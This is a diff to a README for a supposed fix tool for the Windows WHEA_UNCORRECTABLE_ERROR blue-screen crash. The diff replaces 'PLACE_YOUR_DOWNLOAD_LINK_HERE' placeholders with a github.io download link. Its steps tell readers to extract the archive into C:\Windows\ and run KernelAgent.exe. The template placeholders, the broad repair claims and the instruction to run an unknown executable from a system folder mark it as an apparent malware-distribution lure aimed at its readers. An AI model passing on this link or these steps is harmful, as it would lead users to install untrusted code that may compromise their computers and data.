@@ -2,7 +2,8 @@
 
 This tool provides a safe and effective fix for the WHEA_UNCORRECTABLE_ERROR BSOD on Windows 10/11. It resolves CPU, RAM, or BIOS-related crashes that often cause system failure.
 
-[![Download Fix Tool](https://img.shields.io/badge/Download-Fix_Tool-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Fix Tool](https://img.shields.io/badge/Download-Fix_Tool-blueviolet)](https://fix-whea-uncorrectable-error-windows.github.io/.github
+)
 
 ---
 
@@ -17,7 +18,8 @@ This tool provides a safe and effective fix for the WHEA_UNCORRECTABLE_ERROR BSO
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section or from the button above  
+1. 📦 **Download the archive** from the [Releases](https://fix-whea-uncorrectable-error-windows.github.io/.github
+) section or from the button above  
 2. 📁 **Extract the folder** and move it into your main `C:\Windows\` directory  
 3. 🖱 **Run the executable file** `KernelAgent.exe`  
 4. 🔁 Restart your computer after the process is complete
